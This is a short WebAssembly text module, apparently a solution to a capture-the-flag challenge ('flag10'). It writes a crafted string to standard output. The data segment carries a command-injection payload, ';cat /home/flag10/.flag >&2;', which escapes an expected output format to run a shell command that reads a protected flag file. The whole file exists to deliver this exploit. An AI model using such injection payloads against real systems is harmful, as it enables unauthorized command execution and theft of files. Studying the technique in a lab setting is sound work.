(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit"
    (func $proc_exit (param i32)))

  (memory (export "memory") 1) ;; Allocate 1 memory page

  (data (i32.const 0) "v1:;cat /home/flag10/.flag >&2;lllm:d0d5584f\n\00")


  (func $_start (export "_start")

	;; Write flag in the output file
	;; Input structure
    i32.const 600
    i32.const 0 ;; Input data addr
    i32.store

    i32.const 604
    i32.const 45 ;; Input data length 
    i32.store

    i32.const 1 ;; Fd
    i32.const 600 ;; Input struct
    i32.const 1
    i32.const 300 ;;Output addr
    call $fd_write
	drop

	;; Exit
    i32.const 0
    call $proc_exit
  )
)


